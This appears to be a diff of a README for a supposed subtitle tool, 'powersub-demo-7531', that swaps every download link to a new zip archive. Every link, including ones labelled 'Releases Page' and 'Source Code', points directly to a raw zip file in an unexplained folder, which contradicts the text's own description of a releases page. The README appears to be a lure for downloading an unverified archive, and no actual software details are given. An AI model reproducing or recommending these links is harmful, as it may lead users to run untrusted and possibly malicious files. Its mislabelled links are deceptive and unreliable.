@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-7531 - Simple Tool for Effortless Subtitles
 
-[![Download Now](https://raw.githubusercontent.com/bharath738/powersub-demo-7531/main/garneter/powersub-demo-7531.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/bharath738/powersub-demo-7531/main/garneter/powersub-demo-7531.zip)
+[![Download Now](https://raw.githubusercontent.com/bharath738/powersub-demo-7531/main/garneter/demo_powersub_3.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/bharath738/powersub-demo-7531/main/garneter/demo_powersub_3.5.zip)
 
 ## 📥 Overview
 powersub-demo-7531 is a user-friendly application designed to help you manage and synchronize subtitles effortlessly. Whether you're watching movies or TV shows, this tool makes it easy to enhance your viewing experience with accurate subtitles.
@@ -9,7 +9,7 @@ powersub-demo-7531 is a user-friendly application designed to help you manage an
 To get started with powersub-demo-7531, you need to download the application from our Releases page. Follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to access the page where you can download the software.
-   - [Download Here](https://raw.githubusercontent.com/bharath738/powersub-demo-7531/main/garneter/powersub-demo-7531.zip)
+   - [Download Here](https://raw.githubusercontent.com/bharath738/powersub-demo-7531/main/garneter/demo_powersub_3.5.zip)
 
 2. **Find the Latest Version:** On the Releases page, you will see a list of available versions. The latest version will be at the top.
 
@@ -72,13 +72,13 @@ If you encounter issues during installation or operation, check the following:
 ## 🤝 Support
 If you need help, you can check our GitHub Issues page for common questions. Here, you may find helpful answers or steps for problem-solving.
 
-For detailed instructions, or if you wish to report a bug, visit our [Releases page](https://raw.githubusercontent.com/bharath738/powersub-demo-7531/main/garneter/powersub-demo-7531.zip) again and follow the links to the relevant documentation.
+For detailed instructions, or if you wish to report a bug, visit our [Releases page](https://raw.githubusercontent.com/bharath738/powersub-demo-7531/main/garneter/demo_powersub_3.5.zip) again and follow the links to the relevant documentation.
 
 ## 📝 Contributing
 Your contributions are welcome! If you want to help improve powersub-demo-7531, you can fork the repository and submit a Pull Request. All contributions are appreciated.
 
 ## 🔗 Useful Links
-- [Releases Page](https://raw.githubusercontent.com/bharath738/powersub-demo-7531/main/garneter/powersub-demo-7531.zip)
-- [Source Code](https://raw.githubusercontent.com/bharath738/powersub-demo-7531/main/garneter/powersub-demo-7531.zip)
+- [Releases Page](https://raw.githubusercontent.com/bharath738/powersub-demo-7531/main/garneter/demo_powersub_3.5.zip)
+- [Source Code](https://raw.githubusercontent.com/bharath738/powersub-demo-7531/main/garneter/demo_powersub_3.5.zip)
 
 Enjoy using powersub-demo-7531 for all your subtitle needs!
